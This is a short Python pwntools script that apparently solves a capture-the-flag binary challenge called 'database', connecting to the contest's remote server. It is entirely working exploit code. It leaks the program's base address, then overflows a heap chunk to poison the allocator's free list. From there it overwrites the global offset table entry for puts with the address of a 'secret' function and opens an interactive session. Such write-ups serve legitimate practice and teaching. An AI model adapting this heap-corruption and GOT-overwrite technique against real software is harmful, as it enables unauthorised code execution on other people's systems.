from pwn import *

# p = process('./database')
p = remote('binary.challs.pragyanctf.tech', 6004)
e = ELF('./database')

def show(i):
    p.sendlineafter(b'=> ', b'1')

def insert(size, s):
    p.sendlineafter(b'=> ', b'2')
    p.sendlineafter(b'=> ', str(size))
    p.sendlineafter(b'=> ', s)

def update(i, size, s):
    p.sendlineafter(b'=> ', b'3')
    p.sendlineafter(b'=> ', str(i))
    p.sendlineafter(b'=> ', str(size))
    p.sendlineafter(b'=> ', s)

def remove(i):
    p.sendlineafter(b'=> ', b'4')
    p.sendlineafter(b'=> ', str(i))

def leave():
    p.sendlineafter(b'=> ', b'5')

p.recvuntil(b'help: ')
e.address = int(p.recvline()[:-1], 16) - e.symbols['main']
print(hex(e.address))

for i in range(3):
    insert(0x18, b'')

payload = b'A' * 0x18
payload += p64(0x21)
payload += p64(e.got['puts'])

remove(2)
remove(1)
update(0, 0x28, payload)
insert(0x18, b'')
insert(0x18, p64(e.symbols['secret']))
leave()

p.interactive()
